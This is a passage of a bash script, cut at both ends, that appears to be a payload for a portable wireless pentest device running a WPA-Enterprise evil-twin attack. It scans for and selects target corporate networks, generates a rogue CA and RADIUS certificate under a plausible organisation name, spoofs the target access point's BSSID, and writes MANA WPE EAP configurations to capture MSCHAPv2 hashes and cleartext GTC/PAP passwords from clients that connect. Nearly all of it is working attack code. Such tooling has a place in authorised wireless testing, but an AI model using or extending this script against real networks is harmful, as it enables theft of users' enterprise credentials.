
            ssid=""
            bssid="$new_bssid"
            channel=""
            signal=""
            encryption=""

            continue
        fi

        [ "$in_cell" -eq 1 ] || continue

        if [[ "$line" =~ ^[[:space:]]*ESSID:[[:space:]]*(.*)$ ]]; then
            raw="${BASH_REMATCH[1]}"

            if [ "${#raw}" -ge 2 ] &&
               [ "${raw:0:1}" = '"' ] &&
               [ "${raw: -1}" = '"' ]; then
                raw="${raw:1:${#raw}-2}"
            fi

            ssid="$raw"

        elif [[ "$line" =~ Channel:[[:space:]]*([0-9]+) ]]; then
            channel="${BASH_REMATCH[1]}"

        elif [[ "$line" =~ ^[[:space:]]*Signal:[[:space:]]*(-?[0-9]+)[[:space:]]*dBm ]]; then
            signal="${BASH_REMATCH[1]}"

        elif [[ "$line" =~ ^[[:space:]]*Encryption:[[:space:]]*(.*)$ ]]; then
            encryption="${BASH_REMATCH[1]}"
        fi
    done < "$SCAN_RAW_FILE"

    if [ "$in_cell" -eq 1 ]; then
        add_enterprise_scan_record \
            "$ssid" \
            "$bssid" \
            "$channel" \
            "$signal" \
            "$encryption"
    fi

    ENTERPRISE_COUNT=${#ENTERPRISE_SSIDS[@]}

    return 0
}


#
# Sort all BSSID records by signal, strongest first.
#
sort_enterprise_results() {
    local count=${#ENTERPRISE_SSIDS[@]}
    local i j
    local tmp

    for ((i = 0; i < count; i++)); do
        for ((j = i + 1; j < count; j++)); do

            if [ "${ENTERPRISE_SIGNALS[$j]}" -gt \
                 "${ENTERPRISE_SIGNALS[$i]}" ] 2>/dev/null; then

                tmp="${ENTERPRISE_SSIDS[$i]}"
                ENTERPRISE_SSIDS[$i]="${ENTERPRISE_SSIDS[$j]}"
                ENTERPRISE_SSIDS[$j]="$tmp"

                tmp="${ENTERPRISE_BSSIDS[$i]}"
                ENTERPRISE_BSSIDS[$i]="${ENTERPRISE_BSSIDS[$j]}"
                ENTERPRISE_BSSIDS[$j]="$tmp"

                tmp="${ENTERPRISE_CHANNELS[$i]}"
                ENTERPRISE_CHANNELS[$i]="${ENTERPRISE_CHANNELS[$j]}"
                ENTERPRISE_CHANNELS[$j]="$tmp"

                tmp="${ENTERPRISE_SIGNALS[$i]}"
                ENTERPRISE_SIGNALS[$i]="${ENTERPRISE_SIGNALS[$j]}"
                ENTERPRISE_SIGNALS[$j]="$tmp"

                tmp="${ENTERPRISE_ENCRYPTIONS[$i]}"
                ENTERPRISE_ENCRYPTIONS[$i]="${ENTERPRISE_ENCRYPTIONS[$j]}"
                ENTERPRISE_ENCRYPTIONS[$j]="$tmp"
            fi
        done
    done
}


#
# Build the first-level SSID list.
#
# Because the underlying BSSID records are already sorted strongest-first,
# the first observation of an SSID also provides its strongest signal.
#
build_unique_enterprise_ssids() {
    local i j
    local ssid
    local existing

    ENTERPRISE_UNIQUE_SSIDS=()
    ENTERPRISE_UNIQUE_SIGNALS=()
    ENTERPRISE_UNIQUE_COUNTS=()

    for ((i = 0; i < ENTERPRISE_COUNT; i++)); do
        ssid="${ENTERPRISE_SSIDS[$i]}"
        existing=-1

        for ((j = 0; j < ${#ENTERPRISE_UNIQUE_SSIDS[@]}; j++)); do
            if [ "${ENTERPRISE_UNIQUE_SSIDS[$j]}" = "$ssid" ]; then
                existing=$j
                break
            fi
        done

        if [ "$existing" -ge 0 ]; then
            ENTERPRISE_UNIQUE_COUNTS[$existing]=$((ENTERPRISE_UNIQUE_COUNTS[$existing] + 1))
        else
            ENTERPRISE_UNIQUE_SSIDS+=("$ssid")
            ENTERPRISE_UNIQUE_SIGNALS+=("${ENTERPRISE_SIGNALS[$i]}")
            ENTERPRISE_UNIQUE_COUNTS+=(1)
        fi
    done

    ENTERPRISE_UNIQUE_COUNT=${#ENTERPRISE_UNIQUE_SSIDS[@]}
}


log_enterprise_scan_results() {
    local i

    logboth green "WPA-Enterprise BSSIDs found: $ENTERPRISE_COUNT"
    logboth green "Unique WPA-Enterprise SSIDs: $ENTERPRISE_UNIQUE_COUNT"

    for ((i = 0; i < ENTERPRISE_COUNT; i++)); do
        logboth blue \
            "AP: SSID='${ENTERPRISE_SSIDS[$i]}' BSSID=${ENTERPRISE_BSSIDS[$i]} Ch=${ENTERPRISE_CHANNELS[$i]} Signal=${ENTERPRISE_SIGNALS[$i]}dBm Encryption='${ENTERPRISE_ENCRYPTIONS[$i]}'"
    done
}


scan_enterprise_networks() {
    local sid

    led_recon

    logboth blue "Starting WPA-Enterprise discovery"

    sid=$(START_SPINNER "Scanning WiFi...")

    if ! perform_multiband_scan; then
        STOP_SPINNER "$sid"

        logboth red "Multi-band WiFi scan failed"
        return 1
    fi

    if ! parse_enterprise_scan_results; then
        STOP_SPINNER "$sid"

        logboth red "Unable to parse WiFi scan results"
        return 1
    fi

    sort_enterprise_results
    build_unique_enterprise_ssids

    STOP_SPINNER "$sid"

    log_enterprise_scan_results

    if [ "$ENTERPRISE_COUNT" -eq 0 ]; then
        logboth yellow "No WPA-Enterprise networks found"
        return 2
    fi

    return 0
}


#
# Find every BSSID index associated with an SSID.
#
get_ssid_bssid_indices() {
    local wanted_ssid="$1"
    local i

    for ((i = 0; i < ENTERPRISE_COUNT; i++)); do
        if [ "${ENTERPRISE_SSIDS[$i]}" = "$wanted_ssid" ]; then
            printf '%s\n' "$i"
        fi
    done
}


set_target_from_scan_index() {
    local index="$1"

    TARGET_SSID="${ENTERPRISE_SSIDS[$index]}"
    TARGET_BSSID="${ENTERPRISE_BSSIDS[$index]}"
    TARGET_CHANNEL="${ENTERPRISE_CHANNELS[$index]}"
    TARGET_SIGNAL="${ENTERPRISE_SIGNALS[$index]}"

    logboth green "Target selected: SSID='$TARGET_SSID'"
    logboth blue "Target BSSID: $TARGET_BSSID"
    logboth blue "Target channel: $TARGET_CHANNEL"
    logboth blue "Target signal: ${TARGET_SIGNAL}dBm"

    return 0
}


#
# Second-level picker for an SSID advertised by multiple APs.
#
select_enterprise_bssid() {
    local wanted_ssid="$1"

    local indices=()
    local options=()

    local index
    local label
    local selected
    local selected_position=-1
    local i

    while IFS= read -r index; do
        [ -n "$index" ] || continue

        indices+=("$index")

        #
        # Signal and channel are deliberately first because they're usually
        # more useful on the Pager display than the MAC address.
        #
        label="${ENTERPRISE_SIGNALS[$index]}dBm Ch${ENTERPRISE_CHANNELS[$index]} ${ENTERPRISE_BSSIDS[$index]}"
        options+=("$label")
    done < <(get_ssid_bssid_indices "$wanted_ssid")

    if [ "${#indices[@]}" -eq 0 ]; then
        return 1
    fi

    #
    # There is no reason to display a second picker for a single AP.
    #
    if [ "${#indices[@]}" -eq 1 ]; then
        set_target_from_scan_index "${indices[0]}"
        return 0
    fi

    options+=("<- Back")

    selected=$(ui_list_picker \
        "$wanted_ssid - Select AP" \
        "${options[0]}" \
        "${options[@]}") || return 2

    [ "$selected" = "<- Back" ] && return 2

    for ((i = 0; i < ${#options[@]} - 1; i++)); do
        if [ "${options[$i]}" = "$selected" ]; then
            selected_position=$i
            break
        fi
    done

    [ "$selected_position" -ge 0 ] || return 1

    set_target_from_scan_index "${indices[$selected_position]}"
    return 0
}


#
# First-level picker. Each SSID appears only once.
#
select_enterprise_ssid() {
    local options=()
    local labels=()

    local i
    local label
    local selected
    local selected_ssid=""
    local result

    for ((i = 0; i < ENTERPRISE_UNIQUE_COUNT; i++)); do
        #
        # Show strongest observed signal as a useful hint.
        #
        # Add an AP count only when the SSID is duplicated.
        #
        if [ "${ENTERPRISE_UNIQUE_COUNTS[$i]}" -gt 1 ]; then
            label="${ENTERPRISE_UNIQUE_SSIDS[$i]}  ${ENTERPRISE_UNIQUE_SIGNALS[$i]}dBm (${ENTERPRISE_UNIQUE_COUNTS[$i]} APs)"
        else
            label="${ENTERPRISE_UNIQUE_SSIDS[$i]}  ${ENTERPRISE_UNIQUE_SIGNALS[$i]}dBm"
        fi

        labels+=("$label")
        options+=("$label")
    done

    options+=("<- Back")

    while true; do
        selected=$(ui_list_picker \
            "WPA-Enterprise Networks" \
            "${options[0]}" \
            "${options[@]}") || return 2

        [ "$selected" = "<- Back" ] && return 2

        selected_ssid=""

        for ((i = 0; i < ENTERPRISE_UNIQUE_COUNT; i++)); do
            if [ "${labels[$i]}" = "$selected" ]; then
                selected_ssid="${ENTERPRISE_UNIQUE_SSIDS[$i]}"
                break
            fi
        done

        [ -n "$selected_ssid" ] || continue

        select_enterprise_bssid "$selected_ssid"
        result=$?

        case "$result" in
            0)
                return 0
                ;;

            2)
                #
                # Back from BSSID picker -> return to SSID picker.
                #
                continue
                ;;

            *)
                ERROR_DIALOG "Unable to select access point"
                ;;
        esac
    done
}


manual_target_entry() {
    local resp

    resp=$(TEXT_PICKER "Target SSID" "CorpWiFi")
    case $? in
        $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR)
            return 1
            ;;
    esac

    if [ -z "$resp" ]; then
        ERROR_DIALOG "SSID cannot be empty"
        return 1
    fi

    TARGET_SSID="$resp"

    resp=$(NUMBER_PICKER \
        "Channel (1-233)" \
        "$DEFAULT_CHANNEL")

    case $? in
        $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR)
            return 1
            ;;
    esac

    TARGET_CHANNEL="${resp:-$DEFAULT_CHANNEL}"
    TARGET_BSSID=""
    TARGET_SIGNAL=""

    logboth green "Manual target selected: SSID='$TARGET_SSID'"
    logboth blue "Manual target channel: $TARGET_CHANNEL"

    return 0
}


#
# Menu shown when a scan completes successfully but does not discover any
# WPA-Enterprise APs.
#
no_enterprise_results_menu() {
    local selected

    selected=$(ui_list_picker \
        "No WPA-Enterprise Networks" \
        "Rescan" \
        "Rescan" \
        "Enter network manually" \
        "<- Back") || return 2

    case "$selected" in
        "Rescan")
            return 0
            ;;

        "Enter network manually")
            return 1
            ;;

        *)
            return 2
            ;;
    esac
}


#
# Menu shown when phy1 exists but none of its interfaces can successfully
# perform an iwinfo scan.
#
scan_failed_menu() {
    local selected

    selected=$(ui_list_picker \
        "WiFi Scan Failed" \
        "Retry" \
        "Retry" \
        "Enter network manually" \
        "<- Back") || return 2

    case "$selected" in
        "Retry")
            return 0
            ;;

        "Enter network manually")
            return 1
            ;;

        *)
            return 2
            ;;
    esac
}


#
# Complete Phase 1 state machine.
#
recon_target_menu() {
    local selected
    local scan_result
    local menu_result

    while true; do
        selected=$(ui_list_picker \
            "Target Network" \
            "Scan for networks" \
            "Scan for networks" \
            "Enter network manually") || return 1

        case "$selected" in
            "Enter network manually")
                if manual_target_entry; then
                    return 0
                fi

                #
                # Cancel from manual entry returns to this menu rather than
                # terminating the complete payload.
                #
                continue
                ;;

            "Scan for networks")
                while true; do
                    scan_enterprise_networks
                    scan_result=$?

                    case "$scan_result" in
                        0)
                            if select_enterprise_ssid; then
                                return 0
                            fi

                            #
                            # Back from the SSID list returns to Target Network.
                            #
                            break
                            ;;

                        2)
                            no_enterprise_results_menu
                            menu_result=$?

                            case "$menu_result" in
                                0)
                                    # Rescan.
                                    continue
                                    ;;

                                1)
                                    if manual_target_entry; then
                                        return 0
                                    fi

                                    # Cancel manual entry -> no-results menu.
                                    continue
                                    ;;

                                *)
                                    # Back -> Target Network.
                                    break
                                    ;;
                            esac
                            ;;

                        *)
                            scan_failed_menu
                            menu_result=$?

                            case "$menu_result" in
                                0)
                                    # Retry.
                                    continue
                                    ;;

                                1)
                                    if manual_target_entry; then
                                        return 0
                                    fi

                                    # Cancel manual entry -> failed-scan menu.
                                    continue
                                    ;;

                                *)
                                    # Back -> Target Network.
                                    break
                                    ;;
                            esac
                            ;;
                    esac
                done
                ;;

            *)
                return 1
                ;;
        esac
    done
}

# ============================================
# PHASE 2: SETUP
# ============================================

valid_certificate_text() {
    printf '%s' "$1" | grep -Eq '^[A-Za-z0-9 .,@_:-]*$'
}

normalize_certificate_settings() {
    valid_certificate_text "$CERT_CA_CN" && [ -n "$CERT_CA_CN" ] || CERT_CA_CN="Internal Root CA"
    valid_certificate_text "$CERT_CN" && [ -n "$CERT_CN" ] || CERT_CN="radius-server-auth.local"
    valid_certificate_text "$CERT_ORG" && [ -n "$CERT_ORG" ] || CERT_ORG="Global Security Authority"
    valid_certificate_text "$CERT_OU" || CERT_OU=""
    valid_certificate_text "$CERT_STATE" || CERT_STATE="State"
    valid_certificate_text "$CERT_LOCALITY" || CERT_LOCALITY="City"
    valid_certificate_text "$CERT_DNS_SANS" && [ -n "$CERT_DNS_SANS" ] || CERT_DNS_SANS="$CERT_CN"
    valid_certificate_text "$CERT_IP_SANS" || CERT_IP_SANS="127.0.0.1"
    case "$CERT_COUNTRY" in [A-Za-z][A-Za-z]) ;; *) CERT_COUNTRY="US" ;; esac
    case "$CERT_DAYS" in ''|*[!0-9]*) CERT_DAYS=3650 ;; esac
    [ "$CERT_DAYS" -lt 1 ] 2>/dev/null && CERT_DAYS=3650
    case "$CERT_RENEW_BEFORE_DAYS" in ''|*[!0-9]*) CERT_RENEW_BEFORE_DAYS=30 ;; esac
    case "$CERT_KEY_BITS" in 2048|3072|4096) ;; *) CERT_KEY_BITS=2048 ;; esac
}

load_certificate_profile() {
    local profile_slug profile_file
    profile_slug=$(safe_slug "$CERT_PROFILE")
    [ -z "$profile_slug" ] && profile_slug="default"
    CERT_PROFILE="$profile_slug"
    profile_file="$CERT_STORE/$CERT_PROFILE/profile.conf"
    [ ! -f "$profile_file" ] && return 0

    while IFS='=' read -r key value; do
        value=${value%$'\r'}
        case "$key" in
            CERT_CA_CN) CERT_CA_CN="$value" ;;
            CERT_CN) CERT_CN="$value" ;;
            CERT_ORG) CERT_ORG="$value" ;;
            CERT_OU) CERT_OU="$value" ;;
            CERT_COUNTRY) CERT_COUNTRY="$value" ;;
            CERT_STATE) CERT_STATE="$value" ;;
            CERT_LOCALITY) CERT_LOCALITY="$value" ;;
            CERT_DNS_SANS) CERT_DNS_SANS="$value" ;;
            CERT_IP_SANS) CERT_IP_SANS="$value" ;;
            CERT_DAYS) CERT_DAYS="$value" ;;
            CERT_KEY_BITS) CERT_KEY_BITS="$value" ;;
            CERT_RENEW_BEFORE_DAYS) CERT_RENEW_BEFORE_DAYS="$value" ;;
        esac
    done < "$profile_file"
}

write_certificate_profile() {
    CERT_DIR="$CERT_STORE/$CERT_PROFILE"
    mkdir -p "$CERT_DIR"
    {
        echo "CERT_CA_CN=$CERT_CA_CN"
        echo "CERT_CN=$CERT_CN"
        echo "CERT_ORG=$CERT_ORG"
        echo "CERT_OU=$CERT_OU"
        echo "CERT_COUNTRY=$CERT_COUNTRY"
        echo "CERT_STATE=$CERT_STATE"
        echo "CERT_LOCALITY=$CERT_LOCALITY"
        echo "CERT_DNS_SANS=$CERT_DNS_SANS"
        echo "CERT_IP_SANS=$CERT_IP_SANS"
        echo "CERT_DAYS=$CERT_DAYS"
        echo "CERT_KEY_BITS=$CERT_KEY_BITS"
        echo "CERT_RENEW_BEFORE_DAYS=$CERT_RENEW_BEFORE_DAYS"
    } > "$CERT_DIR/profile.conf"
    chmod 600 "$CERT_DIR/profile.conf" 2>/dev/null
}

pick_certificate_value() {
    local label="$1"
    local current="$2"
    local answer
    answer=$(TEXT_PICKER "$label" "$current")
    case $? in
        $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR)
            printf '%s' "$current"
            return
            ;;
    esac
    if [ -n "$answer" ] && valid_certificate_text "$answer"; then
        printf '%s' "$answer"
    else
        printf '%s' "$current"
    fi
}

discover_certificate_profiles() {
    local profile_dir
    for profile_dir in "$CERT_STORE"/*; do
        [ -f "$profile_dir/profile.conf" ] || continue
        basename "$profile_dir"
    done
}

edit_certificate_profile_values() {
    local number
    CERT_CA_CN=$(pick_certificate_value "CA common name" "$CERT_CA_CN")
    CERT_CN=$(pick_certificate_value "Server common name" "$CERT_CN")
    CERT_ORG=$(pick_certificate_value "Organization" "$CERT_ORG")
    CERT_OU=$(pick_certificate_value "Organizational unit" "$CERT_OU")
    CERT_COUNTRY=$(pick_certificate_value "Country code" "$CERT_COUNTRY")
    CERT_STATE=$(pick_certificate_value "State / province" "$CERT_STATE")
    CERT_LOCALITY=$(pick_certificate_value "Locality" "$CERT_LOCALITY")
    CERT_DNS_SANS=$(pick_certificate_value "DNS SANs (comma separated)" "$CERT_DNS_SANS")
    CERT_IP_SANS=$(pick_certificate_value "IP SANs (comma separated)" "$CERT_IP_SANS")

    number=$(NUMBER_PICKER "Certificate validity days" "$CERT_DAYS")
    case "$number" in ''|*[!0-9]*) ;; *) CERT_DAYS="$number" ;; esac
    number=$(NUMBER_PICKER "RSA key bits (2048/3072/4096)" "$CERT_KEY_BITS")
    case "$number" in 2048|3072|4096) CERT_KEY_BITS="$number" ;; esac
    normalize_certificate_settings
}

configure_certificate_runtime() {
    local profiles=() profile_name selected default_profile requested_profile action
    local create_option="Create new profile..."

    while true; do
        profiles=()
        while IFS= read -r profile_name; do
            [ -n "$profile_name" ] && profiles+=("$profile_name")
        done < <(discover_certificate_profiles)

        if [ ${#profiles[@]} -eq 0 ]; then
            profiles=("default")
            default_profile="default"
        else
            default_profile="${profiles[0]}"
            for profile_name in "${profiles[@]}"; do
                [ "$profile_name" = "$CERT_PROFILE" ] && default_profile="$profile_name"
            done
        fi
        profiles+=("$create_option")

        selected=$(ui_list_picker "Certificate Profile" "$default_profile" "${profiles[@]}") || return 1
        if [ "$selected" = "$create_option" ]; then
            requested_profile=$(TEXT_PICKER "New certificate profile" "") || return 1
            selected=$(safe_slug "$requested_profile")
            if [ -z "$selected" ]; then
                ERROR_DIALOG "Certificate profile name cannot be empty"
                continue
            fi
            if [ -f "$CERT_STORE/$selected/profile.conf" ]; then
                ERROR_DIALOG "Certificate profile already exists
Select it from the profile list."
                continue
            fi
        fi

        CERT_PROFILE="$selected"
        if [ -f "$CERT_STORE/$CERT_PROFILE/profile.conf" ]; then
            load_certificate_profile
            normalize_certificate_settings
            action=$(ui_list_picker "Certificate: $CERT_PROFILE" "Use saved profile" \
                "Use saved profile" "Edit profile" "Regenerate certificate" "Back") || return 1
        else
            normalize_certificate_settings
            action=$(ui_list_picker "New certificate: $CERT_PROFILE" "Use current defaults" \
                "Use current defaults" "Customize profile" "Back") || return 1
        fi

        case "$action" in
            "Edit profile"|"Customize profile")
                edit_certificate_profile_values
                ;;
            "Regenerate certificate")
                CERT_FORCE_REGENERATE=1
                ;;
            "Back")
                continue
                ;;
        esac

        normalize_certificate_settings
        write_certificate_profile
        write_persistent_settings
        logboth blue "Certificate profile: $CERT_PROFILE ($CERT_CN)"
        return 0
    done
}

append_san_entries() {
    local kind="$1"
    local values="$2"
    local output_file="$3"
    local index=1 value

    local old_ifs="$IFS"
    IFS=','
    for value in $values; do
        IFS="$old_ifs"
        value=$(printf '%s' "$value" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
        if [ -n "$value" ] && valid_certificate_text "$value"; then
            echo "$kind.$index = $value" >> "$output_file"
            index=$((index + 1))
        fi
        IFS=','
    done
    IFS="$old_ifs"
}

certificate_profile_fingerprint() {
    if command -v sha256sum >/dev/null 2>&1; then
        sha256sum "$CERT_DIR/profile.conf" | awk '{print $1}'
    else
        openssl dgst -sha256 "$CERT_DIR/profile.conf" 2>/dev/null | sed 's/.*= //'
    fi
}

generate_certs() {
    local openssl_config="$SESSION_CONFIG_DIR/openssl.conf"
    local generation_dir="$SESSION_WORK_DIR/certificate-generation"
    local stored_fingerprint current_fingerprint renew_seconds

    CERT_DIR="$CERT_STORE/$CERT_PROFILE"
    current_fingerprint=$(certificate_profile_fingerprint)
    stored_fingerprint=$(cat "$CERT_DIR/settings.sha256" 2>/dev/null)
    renew_seconds=$((CERT_RENEW_BEFORE_DAYS * 86400))

    if [ "$CERT_FORCE_REGENERATE" -eq 0 ] && \
       [ -f "$CERT_DIR/ca.pem" ] && [ -f "$CERT_DIR/ca.key" ] && \
       [ -f "$CERT_DIR/server.pem" ] && [ -f "$CERT_DIR/server.key" ] && \
       [ "$current_fingerprint" = "$stored_fingerprint" ] && \
       openssl x509 -checkend "$renew_seconds" -noout -in "$CERT_DIR/server.pem" >/dev/null 2>&1; then
        logboth green "Reusing certificate profile: $CERT_PROFILE"
        openssl x509 -in "$CERT_DIR/server.pem" -noout -fingerprint -sha256 \
            > "$SESSION_DIR/certificate-fingerprint.txt" 2>/dev/null
        cp "$CERT_DIR/profile.conf" "$SESSION_CONFIG_DIR/certificate-profile.conf"
        return 0
    fi

    logboth blue "Generating certificate profile: $CERT_PROFILE"
    local sid=$(START_SPINNER "Generating certs...")

    mkdir -p "$CERT_DIR" "$generation_dir"

    # Create OpenSSL config for SAN and extensions
    cat > "$openssl_config" << EOF
[ req ]
distinguished_name = req_distinguished_name
prompt = no

[ req_distinguished_name ]
C = $CERT_COUNTRY
ST = $CERT_STATE
L = $CERT_LOCALITY
O = $CERT_ORG
OU = $CERT_OU
CN = $CERT_CN

[ v3_ca ]
subjectKeyIdentifier = hash
authorityKeyIdentifier = keyid:always,issuer
basicConstraints = critical, CA:true
keyUsage = critical, digitalSignature, cRLSign, keyCertSign

[ v3_server ]
subjectKeyIdentifier = hash
authorityKeyIdentifier = keyid,issuer:always
basicConstraints = critical, CA:false
keyUsage = critical, digitalSignature, keyEncipherment
extendedKeyUsage = serverAuth
subjectAltName = @alt_names

[ alt_names ]
EOF

    append_san_entries "DNS" "$CERT_DNS_SANS" "$openssl_config"
    append_san_entries "IP" "$CERT_IP_SANS" "$openssl_config"

    # CA private key
    logboth "  - Generating CA private key..."
    openssl genrsa -out "$generation_dir/ca.key" "$CERT_KEY_BITS" 2>/dev/null

    # CA certificate
    logboth "  - Generating CA certificate..."
    openssl req -x509 -new -nodes -key "$generation_dir/ca.key" \
        -days "$CERT_DAYS" -out "$generation_dir/ca.pem" \
        -subj "/C=$CERT_COUNTRY/ST=$CERT_STATE/L=$CERT_LOCALITY/O=$CERT_ORG/OU=$CERT_OU/CN=$CERT_CA_CN" \
        -config "$openssl_config" -extensions v3_ca 2>/dev/null

    # Server private key
    logboth "  - Generating server private key..."
    openssl genrsa -out "$generation_dir/server.key" "$CERT_KEY_BITS" 2>/dev/null

    # Server CSR
    logboth "  - Generating server CSR..."
    openssl req -new -key "$generation_dir/server.key" \
        -out "$generation_dir/server.csr" \
        -subj "/C=$CERT_COUNTRY/ST=$CERT_STATE/L=$CERT_LOCALITY/O=$CERT_ORG/OU=$CERT_OU/CN=$CERT_CN" \
        -config "$openssl_config" 2>/dev/null

    # Sign server cert with CA
    logboth "  - Signing server certificate..."
    openssl x509 -req -in "$generation_dir/server.csr" \
        -CA "$generation_dir/ca.pem" -CAkey "$generation_dir/ca.key" \
        -CAcreateserial -out "$generation_dir/server.pem" \
        -days "$CERT_DAYS" -extfile "$openssl_config" \
        -extensions v3_server 2>/dev/null

    STOP_SPINNER $sid

    if [ -f "$generation_dir/ca.pem" ] && [ -f "$generation_dir/server.pem" ] && \
       [ -f "$generation_dir/server.key" ] && \
       openssl verify -CAfile "$generation_dir/ca.pem" "$generation_dir/server.pem" >/dev/null 2>&1; then
        cp "$generation_dir/ca.pem" "$generation_dir/ca.key" \
        "$generation_dir/server.pem" "$generation_dir/server.key" \
        "$CERT_DIR/" || return 1
        echo "$current_fingerprint" > "$CERT_DIR/settings.sha256"
        cp "$CERT_DIR/profile.conf" "$SESSION_CONFIG_DIR/certificate-profile.conf"
        openssl x509 -in "$CERT_DIR/server.pem" -noout -fingerprint -sha256 \
            > "$SESSION_DIR/certificate-fingerprint.txt" 2>/dev/null
        chmod 600 "$CERT_DIR"/* 2>/dev/null
        logboth green "Certificates generated"
        return 0
    else
        logboth red "Certificate generation failed"
        return 1
    fi
}

create_virtual_interface() {
    logboth blue "Creating virtual interface..."

    # Remove if exists to ensure a clean slate
    if iw dev "$PINEAPOL_IFACE" info >/dev/null 2>&1; then
        ifconfig "$PINEAPOL_IFACE" down 2>/dev/null
        iw dev "$PINEAPOL_IFACE" del 2>/dev/null
        sleep 1
    fi

    # Check if PHY exists
    if ! iw phy "$PHY_DEVICE" info >/dev/null 2>&1; then
        logboth red "Radio $PHY_DEVICE not found!"
        logboth yellow "Falling back to phy0..."
        PHY_DEVICE="phy0"
        if ! iw phy "$PHY_DEVICE" info >/dev/null 2>&1; then
            logboth red "No usable radio found (phy0/phy1)"
            return 1
        fi
    fi

    if ! iw phy "$PHY_DEVICE" info 2>/dev/null | grep -Eq '^[[:space:]]*\*[[:space:]]+AP([[:space:]]|$)'; then
        logboth red "Radio $PHY_DEVICE does not advertise AP mode"
        return 1
    fi

    # Create AP interface
    # This is non-destructive to the physical radio's other interfaces
    if ! iw phy "$PHY_DEVICE" interface add "$PINEAPOL_IFACE" type __ap 2>/dev/null; then
        # Some drivers require 'managed' type first, hostapd will switch it
        if ! iw phy "$PHY_DEVICE" interface add "$PINEAPOL_IFACE" type managed 2>/dev/null; then
            logboth red "Failed to create $PINEAPOL_IFACE on $PHY_DEVICE"
            return 1
        fi
    fi

    # BSSID Spoofing
    if [ -n "$TARGET_BSSID" ]; then
        logboth "  - Spoofing BSSID: $TARGET_BSSID"
        ifconfig "$PINEAPOL_IFACE" down 2>/dev/null
        if ! ifconfig "$PINEAPOL_IFACE" hw ether "$TARGET_BSSID" 2>/dev/null; then
            logboth yellow "  - MAC spoofing failed (driver limitation)"
        fi
    fi

    # Ensure it is DOWN. hostapd will manage the state.
    ifconfig "$PINEAPOL_IFACE" down 2>/dev/null
    sleep 1

    logboth green "Interface $PINEAPOL_IFACE prepared"
    return 0
}

write_eap_user_file() {
    case "$EAP_PROFILE" in
        broad)
            cat > "$EAP_USER_FILE" << 'EAPEOF'
# Every outer method that can carry a MANA WPE credential exchange. The dummy
# password is required by direct MD5/MSCHAPv2/GTC and is ignored by TLS/tunnels.
* MD5,GTC,MSCHAPV2,TTLS,PEAP,FAST,TLS "password"

# Phase 2 - MANA WPE rewrites the lookup identity to "t".
# These are every credential-bearing inner method supported by the bundled
# MANA WPE build. The dummy password permits challenge-response capture;
# unknown passwords are not expected to authenticate successfully.
"t" TTLS-PAP,GTC,TTLS-CHAP,TTLS-MSCHAP,TTLS-MSCHAPV2,MD5,MSCHAPV2 "password" [2]
EAPEOF
            ;;
        peap-mschapv2|peap-gtc|peap-md5)
            local peap_inner
            case "$EAP_PROFILE" in
                peap-mschapv2) peap_inner="MSCHAPV2" ;;
                peap-gtc) peap_inner="GTC" ;;
                peap-md5) peap_inner="MD5" ;;
            esac
            cat > "$EAP_USER_FILE" << 'EAPEOF'
* PEAP [ver=0]
EAPEOF
            printf '"t" %s "password" [2]\n' "$peap_inner" >> "$EAP_USER_FILE"
            ;;
        ttls-eap-md5|ttls-eap-gtc|ttls-eap-mschapv2|ttls-mschapv2|ttls-mschap|ttls-pap|ttls-chap)
            local ttls_inner
            case "$EAP_PROFILE" in
                ttls-eap-md5) ttls_inner="MD5" ;;
                ttls-eap-gtc) ttls_inner="GTC" ;;
                ttls-eap-mschapv2) ttls_inner="MSCHAPV2" ;;
                ttls-mschapv2) ttls_inner="TTLS-MSCHAPV2" ;;
                ttls-mschap) ttls_inner="TTLS-MSCHAP" ;;
                ttls-pap) ttls_inner="TTLS-PAP" ;;
                ttls-chap) ttls_inner="TTLS-CHAP" ;;
            esac
            cat > "$EAP_USER_FILE" << 'EAPEOF'
* TTLS
EAPEOF
            printf '"t" %s "password" [2]\n' "$ttls_inner" >> "$EAP_USER_FILE"
            ;;
        eap-tls)
            cat > "$EAP_USER_FILE" << 'EAPEOF'
* TLS
EAPEOF
            ;;
        eap-tls-accept-any)
            cat > "$EAP_USER_FILE" << 'EAPEOF'
* TLS
EAPEOF
            ;;
        fast-mschapv2|fast-gtc)
            local fast_inner
            case "$EAP_PROFILE" in
                fast-mschapv2) fast_inner="MSCHAPV2" ;;
                fast-gtc) fast_inner="GTC" ;;
            esac
            cat > "$EAP_USER_FILE" << 'EAPEOF'
* FAST
EAPEOF
            printf '"t" %s "password" [2]\n' "$fast_inner" >> "$EAP_USER_FILE"
            ;;
        md5|mschapv2|gtc)
            local direct_method
            case "$EAP_PROFILE" in
                md5) direct_method="MD5" ;;
                mschapv2) direct_method="MSCHAPV2" ;;
                gtc) direct_method="GTC" ;;
            esac
            cat > "$EAP_USER_FILE" << 'EAPEOF'
EAPEOF
            printf '* %s "password"\n' "$direct_method" >> "$EAP_USER_FILE"
            ;;
        *)
            logboth red "Unsupported EAP profile: $EAP_PROFILE"
            return 1
            ;;
    esac

    if [ -f "$EAP_USER_FILE" ]; then
        cp "$EAP_USER_FILE" "$EAP_PROFILE_DIR/$EAP_PROFILE.eap_user" 2>/dev/null
        logboth green "EAP user file created ($EAP_PROFILE profile)"
        return 0
    else
        logboth red "EAP user file failed"
        return 1
    fi
}

eap_profile_label() {
    case "$1" in
        broad) printf '%s' "Broad / automatic" ;;
        peap-mschapv2) printf '%s' "PEAP + MSCHAPv2 [hash]" ;;
        peap-gtc) printf '%s' "PEAP + GTC [cleartext]" ;;
        peap-md5) printf '%s' "PEAP + MD5 [hash]" ;;
        ttls-eap-md5) printf '%s' "TTLS + EAP-MD5 [hash]" ;;
        ttls-eap-gtc) printf '%s' "TTLS + EAP-GTC [cleartext]" ;;
        ttls-eap-mschapv2) printf '%s' "TTLS + EAP-MSCHAPv2 [hash]" ;;
        ttls-pap) printf '%s' "TTLS + PAP [cleartext]" ;;
        ttls-chap) printf '%s' "TTLS + CHAP [hash]" ;;
        ttls-mschap) printf '%s' "TTLS + MSCHAPv1 [hash]" ;;
        ttls-mschapv2) printf '%s' "TTLS + MSCHAPv2 [hash]" ;;
        eap-tls) printf '%s' "EAP-TLS [certificate]" ;;
        eap-tls-accept-any) printf '%s' "EAP-TLS [accept client cert]" ;;
